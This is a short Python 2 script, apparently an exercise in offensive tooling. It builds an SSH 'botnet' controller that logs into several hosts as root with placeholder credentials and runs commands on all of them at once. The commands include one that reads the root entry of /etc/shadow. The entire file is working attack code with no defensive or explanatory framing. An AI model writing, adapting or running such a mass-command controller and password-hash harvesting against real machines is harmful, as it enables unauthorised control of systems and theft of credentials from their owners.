import pxssh
import nmap
import socket
import optparse

class Client:
	def __init__(self, host, user, pwd):
		self.host = host
		self.user = user
		self.pwd = pwd
		self.session = self.connect()
	def connect(self):
		try:
			s=pxssh.pxssh()
			s.login(self.host ,self.user, self.pwd)
			return s
		except Exception, e:
			return str(e)
	def send_command(self, cmd):
		self.session.sendline(cmd)
		self.session.prompt()
		return self.session.before
def botnet_command(command):
	for client in botNet:
		output = client.send_command(command)
		print "Output from " , client.host
		print "Output returned " , output , "\n"
def add_client(host, user, pwd):
	client = Client(host, user, pwd)
	botNet.append(client)
botNet = []
add_client('IP1', 'root', 'pwd')
add_client('IP2', 'root', 'pwd')
add_client('IP3', 'root', 'pwd')

botnet_command('uname -v')
botnet_command('cat /etc/shadow | grep root')	
